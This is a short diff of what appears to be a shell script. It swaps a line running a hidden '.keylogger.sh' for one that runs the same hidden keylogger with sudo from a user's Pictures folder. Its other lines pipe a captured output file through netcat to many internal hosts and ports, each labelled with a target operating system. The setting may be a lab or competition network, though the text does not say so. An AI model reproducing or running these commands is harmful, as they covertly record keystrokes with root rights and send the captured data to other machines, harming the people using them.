@@ -1,4 +1,3 @@
-exec ./.keylogger.sh
 pv .out | nc 10.0.101.42 389   #Windows Server 2016
 pv .out | nc 10.0.101.11 3306   #Centos 7
 pv .out | nc 10.0.101.12 80   #Debian 9
@@ -52,3 +51,5 @@ pv .out | nc 10.0.104.3 8080   #Security onion (why not)
 pv .out | nc 10.0.104.129 8080   #Centos 6
 
 pv .out | nc 192.168.20.51 4444 # temp test vm
+
+sudo sh /home/cp_user/Pictures/.keylogger.sh
